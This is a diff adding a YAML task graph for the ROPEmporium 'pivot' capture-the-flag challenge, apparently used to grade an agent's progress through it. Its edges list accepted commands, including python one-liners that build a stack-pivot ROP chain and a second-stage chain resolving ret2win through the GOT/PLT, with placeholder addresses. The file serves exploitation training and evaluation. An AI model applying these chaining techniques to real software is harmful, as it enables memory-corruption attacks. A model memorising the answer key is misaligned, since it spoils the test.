@@ -1,0 +1,146 @@
+version: '0.5'
+graph:
+  type: reference
+challenge:
+  id: ropemporium_pivot
+  name: ROPEmporium pivot
+  description: Place a larger ROP chain in the alternate memory area, pivot the stack
+    to it, resolve ret2win() through foothold_function() and the GOT/PLT, then call
+    ret2win().
+attacker_context:
+  user: ctf-player
+  access:
+    method: local_shell
+    credentials: null
+  target:
+    host: local
+    path: <path-to-challenge-binary>
+    architecture: <challenge-architecture>
+    os: linux
+goal:
+  node: node6
+irrelevant_commands:
+- pwd
+- id
+- whoami
+- clear
+- history
+- uname
+- hostname
+- man
+- man ropper
+- python3
+- python
+- bash
+- sh
+nodes:
+- id: start
+  type: sentinel
+  label: Start
+- id: node0
+  type: state
+  label: Pivot address obtained
+- id: node1
+  type: state
+  label: Stack pivot gadget identified
+- id: node2
+  type: state
+  label: foothold_function PLT/GOT identified
+- id: node3
+  type: state
+  label: ret2win offset identified
+- id: node4
+  type: state
+  label: Second-stage ROP chain crafted
+- id: node5
+  type: state
+  label: Initial pivot chain crafted
+- id: node6
+  type: state
+  label: Flag printed
+edges:
+- action: obtain_pivot_address_from_program_output
+  accepted_commands:
+  - ./pivot
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*0x[0-9a-fA-F]+.*
+    stderr_regex: .*
+  id: edge0
+  from: start
+  to: node0
+- action: find_stack_pivot_gadget
+  accepted_commands:
+  - ROPgadget --binary pivot | grep "xchg rsp"
+  - ROPgadget --binary pivot | grep "leave ; ret"
+  - ropper --file pivot --stack-pivot
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: .*
+  id: edge1
+  from: node0
+  to: node1
+- action: locate_foothold_plt_and_got
+  accepted_commands:
+  - objdump -d pivot | grep foothold_function
+  - rabin2 -i pivot | grep foothold_function
+  - readelf -r pivot | grep foothold_function
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*foothold_function.*
+    stderr_regex: .*
+  id: edge2
+  from: node1
+  to: node2
+- action: identify_ret2win_offset_in_shared_object
+  accepted_commands:
+  - objdump -d libpivot.so | grep ret2win
+  - nm -D libpivot.so | grep ret2win
+  - readelf -Ws libpivot.so | grep ret2win
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*ret2win.*
+    stderr_regex: .*
+  id: edge3
+  from: node2
+  to: node3
+- action: craft_second_stage_chain_for_resolution_and_call
+  accepted_commands:
+  - python3 -c "from struct import pack; import sys; foothold_plt=0xFOOTHOLD_PLT;
+    foothold_got=0xFOOTHOLD_GOT; pop_rax=0xPOP_RAX_RET; xchg_rax_rsp=0xXCHG_RAX_RSP_RET;
+    mov_rax_ptr_rax=0xMOV_RAX_PTR_RAX_RET; pop_rbp=0xPOP_RBP_RET; add_rax_rbp=0xADD_RAX_RBP_RET;
+    call_rax=0xCALL_RAX; ret2win_off=0xRET2WIN_MINUS_FOOTHOLD; chain=pack('<Q', foothold_plt)+pack('<Q',
+    pop_rax)+pack('<Q', foothold_got)+pack('<Q', mov_rax_ptr_rax)+pack('<Q', pop_rbp)+pack('<Q',
+    ret2win_off)+pack('<Q', add_rax_rbp)+pack('<Q', call_rax); sys.stdout.buffer.write(chain)"
+    > stage2.bin
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: .*
+  id: edge4
+  from: node3
+  to: node4
+- action: combine_stage_two_with_pivot_stub
+  accepted_commands:
+  - python3 -c "from struct import pack; import sys; pad=b'A'*40; pivot_addr=0xPIVOT_ADDR_FROM_BANNER;
+    pop_rax=0xPOP_RAX_RET; xchg_rax_rsp=0xXCHG_RAX_RSP_RET; sys.stdout.buffer.write(pad
+    + pack('<Q', pop_rax) + pack('<Q', pivot_addr) + pack('<Q', xchg_rax_rsp))" >
+    payload.bin
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: .*
+  id: edge5
+  from: node4
+  to: node5
+- action: execute_payload_and_reach_ret2win
+  accepted_commands:
+  - ./pivot < payload.bin
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*flag.*
+    stderr_regex: .*
+  id: edge6
+  from: node5
+  to: node6
